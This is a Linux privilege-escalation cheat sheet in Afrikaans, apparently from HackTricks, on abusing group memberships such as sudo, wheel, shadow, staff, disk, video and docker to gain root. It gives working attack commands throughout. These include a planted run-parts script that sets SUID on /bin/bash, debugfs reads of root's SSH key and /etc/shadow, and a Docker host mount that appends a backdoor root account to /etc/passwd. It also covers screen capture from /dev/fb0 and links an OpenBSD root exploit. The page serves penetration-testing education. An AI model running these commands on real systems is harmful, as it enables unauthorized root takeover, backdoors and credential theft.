# Interessante Groepe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groepe

### **PE - Method 1**

**Soms**, **by default (of omdat sommige software dit benodig)** kan jy binne die **/etc/sudoers**-lêer sommige van hierdie reëls vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat aan die groep sudo of admin behoort, enigiets met sudo kan uitvoer**.

As dit die geval is, kan jy om **root te word eenvoudig die volgende uitvoer**:
```
sudo su
```
### PE - Method 2

Find all suid binaries and check if the binary **Pkexec** exists:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binary **pkexec ’n SUID binary is** en jy aan **sudo** of **admin** behoort, kan jy waarskynlik binaries as sudo uitvoer met `pkexec`.\
Dit is omdat dit tipies die groepe binne die **polkit policy** is. Hierdie policy identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en dat die groepe **sudo** en **admin** **by verstek** in sommige Linux-distros verskyn.

Om **root** te word, kan jy uitvoer:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder ’n GUI verbind is nie**. En daar is ’n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh-sessies**:<sup>[[1]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Soms**, **by verstek** kan jy binne die **/etc/sudoers**-lêer hierdie reël vind:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat aan die wheel-groep behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word, kan jy eenvoudig uitvoer**:
```
sudo su
```
## Shadow-groep

Gebruikers in die **shadow**-groep kan die **/etc/shadow**-lêer **lees**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Lees dus die lêer en probeer om **sommige hashes te crack**.

’n Belangrike nuanse oor die lock-status wanneer jy hashes triage:
- Inskrywings met `!` of `*` is oor die algemeen nie-interaktief vir password-logins.
- `!hash` beteken gewoonlik dat ’n password gestel en daarna gelock is.
- `*` beteken gewoonlik dat geen geldige password-hash ooit gestel is nie.
Dit is nuttig vir account-klassifikasie, selfs wanneer direkte login geblokkeer word.

## Staff-groep

**staff**: Laat users toe om plaaslike wysigings aan die stelsel (`/usr/local`) te maak sonder root privileges (let daarop dat executables in `/usr/local/bin` in die PATH-variable van enige user is, en dat hulle die executables in `/bin` en `/usr/bin` met dieselfde naam kan "override"). Vergelyk dit met die groep "adm", wat meer met monitoring/security verband hou. [\[source\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>

In Debian-distributions wys die `$PATH`-variable dat `/usr/local/` met die hoogste priority uitgevoer sal word, ongeag of jy ’n privileged user is of nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ons sommige programme in `/usr/local` kan hijack, kan ons maklik root kry.

Om die `run-parts`-program te hijack, is ’n maklike manier om root te kry, omdat die meeste programme ’n `run-parts` sal uitvoer, soos crontab en wanneer daar met ssh aangemeld word.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
of wanneer 'n nuwe ssh-sessie aangemeld word.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Skyfgroep

Hierdie voorreg is amper **ekwivalent aan root access** aangesien jy toegang tot al die data binne die masjien kan verkry.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
As jy egter probeer om **lêers wat deur root besit word** te **skryf** (soos `/etc/shadow` of `/etc/passwd`), sal jy ’n "**Permission denied**"-fout kry.

## Video-groep

Deur die opdrag `w` te gebruik, kan jy uitvind **wie op die stelsel aangemeld is**, en dit sal ’n uitvoer soos die volgende een vertoon:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies** by ’n terminaal op die masjien aangemeld is.

Die **video-groep** het toegang om die skermuitset te bekyk. Basies kan jy die skerms waarneem. Om dit te doen, moet jy die **huidige beeld op die skerm** as rou data vaslê en die resolusie bepaal wat die skerm gebruik. Die skermdata kan in `/dev/fb0` gestoor word, en jy kan die resolusie van hierdie skerm in `/sys/class/graphics/fb0/virtual_size` vind.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **raw image** te **open**, kan jy **GIMP** gebruik, die **`screen.raw`**-lêer kies en **Raw image data** as lêertipe kies:

![Disk Group - Video Group: Om die raw image te open, kan jy GIMP gebruik, die screen.raw-lêer kies en Raw image data as lêertipe kies](<../../../images/image (463).png>)

Verander dan die Width en Height na dié wat op die skerm gebruik word en toets verskillende Image Types (en kies die een wat die skerm die beste vertoon):

![Disk Group - Video Group: Verander dan die Width en Height na dié wat op die skerm gebruik word en toets verskillende Image Types (en kies die een wat die skerm die beste vertoon)](<../../../images/image (317).png>)

## Root Group

Dit lyk asof **lede van die root group** by verstek toegang kan hê om sommige **service**-konfigurasielêers, sommige **library**-lêers of **ander interessante dinge** te **wysig** wat gebruik kan word om privileges te eskaleer...

**Kontroleer watter lêers root-lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Jy kan die **root-lêerstelsel van die gasheermasjien aan ’n instance se volume mount**, sodat dit onmiddellik ’n `chroot` in daardie volume laai wanneer die instance begin. Dit gee jou effektief root op die masjien.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Ten slotte, as jy nie van enige van die vorige voorstelle hou nie, of as hulle om een of ander rede nie werk nie (docker api firewall?), kan jy altyd probeer om **'n privileged container te run en daaruit te escape**, soos hier verduidelik:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

As jy skryftoestemmings oor die docker-socket het, lees [**hierdie post oor hoe om privileges te escalate deur die docker-socket te abuse**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Groep

{{#ref}}
./
{{#endref}}

## Adm-groep

Gewoonlik het **lede** van die **`adm`**-groep toestemmings om loglêers te **lees** wat binne _/var/log/_ geleë is.\
As jy dus 'n user binne hierdie groep gekompromitteer het, moet jy beslis **na die logs kyk**.

## Backup / Operator / lp / Mail-groepe

Hierdie groepe is dikwels **credential-discovery**-vektore eerder as direkte root-vektore:
- **backup**: kan archives met configs, keys, DB dumps of tokens blootstel.
- **operator**: platform-spesifieke operasionele toegang wat sensitiewe runtime-data kan lek.
- **lp**: print queues/spools kan dokumentinhoud bevat.
- **mail**: mail spools kan reset-skakels, OTPs en interne credentials blootstel.

Behandel lidmaatskap hier as 'n hoëwaarde-data-blootstellingsbevinding en pivot deur hergebruik van passwords/tokens.

## Auth-groep

In OpenBSD kan die **auth**-groep gewoonlik skryf in die vouers _**/etc/skey**_ en _**/var/db/yubikey**_ indien hulle gebruik word.\
Hierdie toestemmings kan met die volgende exploit misbruik word om **privileges** na root te **escalate**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## Verwysings

- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)

{{#include ../../../banners/hacktricks-training.md}}
